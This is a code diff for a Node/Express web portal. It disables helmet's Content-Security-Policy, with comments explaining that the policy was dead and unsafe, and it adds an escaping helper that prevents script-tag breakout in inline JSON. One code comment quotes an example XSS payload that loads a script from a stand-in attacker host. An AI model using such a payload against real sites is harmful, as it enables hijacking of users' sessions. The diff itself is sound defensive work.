@@ -13,60 +13,30 @@ require('dotenv').config();
 const SESSION_COOKIE = process.env.SESSION_COOKIE_NAME || 'tashkheesa_portal';
 
 function baseMiddlewares(app) {
-  // Helmet (CSP configured to allow Uploadcare widget + CDN assets)
+  // Helmet — every header EXCEPT Content-Security-Policy.
+  //
+  // CSP is owned exclusively by the nonce middleware in src/server.js, which
+  // calls res.setHeader('Content-Security-Policy', ...). setHeader REPLACES,
+  // so helmet's policy never reached a browser: whichever ran last won, and
+  // server.js always did. The directive block that used to live here was
+  // therefore dead configuration that merely *looked* authoritative.
+  //
+  // It is deleted rather than left in place because it was actively dangerous
+  // dead code:
+  //   * script-src contained "'unsafe-inline'". If middleware order had ever
+  //     shifted so helmet ran last, every inline <script> in the tree — and
+  //     every injected one — would have executed, silently voiding the
+  //     nonce-based policy the views are written against.
+  //   * script-src also contained two PATH entries, '/js/availability-form.js'
+  //     and '/js/booking-form.js'. CSP source expressions are scheme/host/port
+  //     only; a leading-slash path is not a valid source and is ignored by
+  //     browsers. Whoever added them believed they were allow-listing two
+  //     files; they were allow-listing nothing.
+  // The live directives (media-src blob:, worker-src blob:, form-action 'self')
+  // have been carried over into the server.js array so nothing is lost.
   app.use(
     helmet({
-      contentSecurityPolicy: {
-        useDefaults: true,
-        directives: {
-          // Keep defaults, but allow Uploadcare scripts/styles/assets
-          'script-src': [
-            "'self'",
-            "'unsafe-inline'",
-            'https://ucarecdn.com',
-            'https://uploadcare.com',
-            'https://media.twiliocdn.com', '/js/availability-form.js', '/js/booking-form.js'
-          ],
-          'style-src': [
-            "'self'",
-            "'unsafe-inline'",
-            'https://ucarecdn.com',
-            'https://uploadcare.com'
-          ],
-          'img-src': [
-            "'self'",
-            'data:',
-            'blob:',
-            'https://ucarecdn.com'
-          ],
-          'font-src': [
-            "'self'",
-            'data:',
-            'https://ucarecdn.com'
-          ],
-          'connect-src': [
-            "'self'",
-            'https://upload.uploadcare.com',
-            'https://api.uploadcare.com',
-            'https://ucarecdn.com',
-            'wss://*.twilio.com',
-            'https://*.twilio.com'
-          ],
-          'media-src': [
-            "'self'",
-            'blob:'
-          ],
-          'frame-src': [
-            "'self'",
-            'https://uploadcare.com',
-            'https://ucarecdn.com'
-          ],
-          'worker-src': [
-            "'self'",
-            'blob:'
-          ]
-        }
-      },
+      contentSecurityPolicy: false,
       // Avoid blocking third-party resources used by widgets/CDNs
       crossOriginEmbedderPolicy: false
     })
@@ -239,6 +209,29 @@ function baseMiddlewares(app) {
     res.locals.formatDate     = (iso, opts)         => fmt.formatDate(iso, lang, opts);
     res.locals.formatDateTime = (iso, opts)         => fmt.formatDateTime(iso, lang, opts);
     res.locals.t = (key) => translate(key, lang);
+    // XSS-safe serialiser for embedding a value inside an inline <script>.
+    //
+    // `<%- JSON.stringify(v) %>` is NOT safe there. JSON.stringify does not
+    // escape '<', so a value containing the literal text "</script>" closes the
+    // enclosing script element from inside a JS string literal, and everything
+    // after it is parsed as fresh HTML by the tokenizer. A stored value of
+    //   </script><script src="https://evil.example/x.js"></script>
+    // becomes a live external script tag with the viewer's session.
+    //
+    // Rewriting '<' and '>' to their backslash-u003c / backslash-u003e escapes
+    // leaves the parsed
+    // JS string value byte-for-byte identical, but the HTML tokenizer never
+    // sees a '<' and so can never find a tag. '&' is escaped too so the output
+    // is also correct if it ever lands in an HTML-escaping context, and
+    // U+2028/U+2029 because JSON permits them raw while (pre-ES2019) JS treats
+    // them as line terminators inside string literals.
+    res.locals.jsonForScript = (v) =>
+      JSON.stringify(v === undefined ? null : v)
+        .replace(/</g, '\\u003c')
+        .replace(/>/g, '\\u003e')
+        .replace(/&/g, '\\u0026')
+        .replace(/\u2028/g, '\\u2028')
+        .replace(/\u2029/g, '\\u2029');
     // Always-charge-EGP local-price display helpers (read-only over the stored
     // EGP charge; NEVER change orders.price/currency). See utils/money_display.js.
     res.locals.isIntlOrder      = (order)  => moneyDisplay.isIntlOrder(order);
